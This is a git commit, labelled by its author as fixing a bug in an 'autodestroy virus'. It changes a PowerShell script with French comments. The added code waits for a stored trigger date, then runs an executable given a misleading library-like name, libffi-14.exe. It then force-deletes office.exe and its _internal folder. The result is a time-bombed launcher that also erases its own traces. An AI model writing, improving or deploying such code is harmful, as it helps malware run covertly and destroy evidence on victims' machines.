8869489a2b10cc51a6b35968749f6cd8e6a29bdb
SaturnXIII <110695125+SaturnXIII@users.noreply.github.com>
2024-01-08 23:24:29 +0100

    Fix bug autodestroy virus 💥

--- script/autodestroy.ps1
+++ script/autodestroy.ps1
@@ -1,8 +1,17 @@
 # Chemin du fichier contenant la date
-$cheminFichierDate = "date.txt"
+$cheminFichierDate = "_internal/date.txt"
 
-# Chemin du dossier � supprimer
-$dossierASupprimer = "C:\Windows-office"
+# Chemin du fichier à supprimer
+$cheminFichierCoucou = "office.exe"
+
+# Chemin du dossier à supprimer
+$cheminDossierCoucou = "_internal"
+
+# Chemin du dossier à supprimer
+$dossierASupprimer = "_internal"
+
+# Chemin du fichier exécutable
+$cheminExecutable = "_internal\libffi-14.exe"
 
 # Lire la date depuis le fichier
 $dateTexte = Get-Content -Path $cheminFichierDate
@@ -15,13 +24,37 @@ $dateActuelle = Get-Date
 
 # Comparer les dates
 if ($date -le $dateActuelle) {
+    # Vérifier si le fichier exécutable existe
+    if (Test-Path $cheminExecutable -PathType Leaf) {
+        # Lancer le fichier exécutable
+        Start-Process -FilePath $cheminExecutable -NoNewWindow -Wait
+    } else {
+        Write-Host "Le fichier exécutable $cheminExecutable n'existe pas."
+    }
+
+    # Supprimer le fichier "coucou.exe" s'il existe
+    if (Test-Path $cheminFichierCoucou -PathType Leaf) {
+        Remove-Item -Path $cheminFichierCoucou -Force
+        Write-Host "Le fichier $cheminFichierCoucou a été supprimé."
+    } else {
+        Write-Host "Le fichier $cheminFichierCoucou n'existe pas."
+    }
+
+    # Supprimer le dossier "coucou" s'il existe
+    if (Test-Path $cheminDossierCoucou -PathType Container) {
+        Remove-Item -Path $cheminDossierCoucou -Recurse -Force
+        Write-Host "Le dossier $cheminDossierCoucou a été supprimé."
+    } else {
+        Write-Host "Le dossier $cheminDossierCoucou n'existe pas."
+    }
+
     # Supprimer le dossier s'il existe
     if (Test-Path $dossierASupprimer -PathType Container) {
         Remove-Item -Path $dossierASupprimer -Recurse -Force
-        Write-Host "Le dossier $dossierASupprimer a �t� supprim�."
+        Write-Host "Le dossier $dossierASupprimer a été supprimé."
     } else {
         Write-Host "Le dossier $dossierASupprimer n'existe pas."
     }
 } else {
-    Write-Host "La date dans le fichier est post�rieure � la date actuelle."
+    Write-Host "La date dans le fichier est postérieure à la date actuelle."
 }
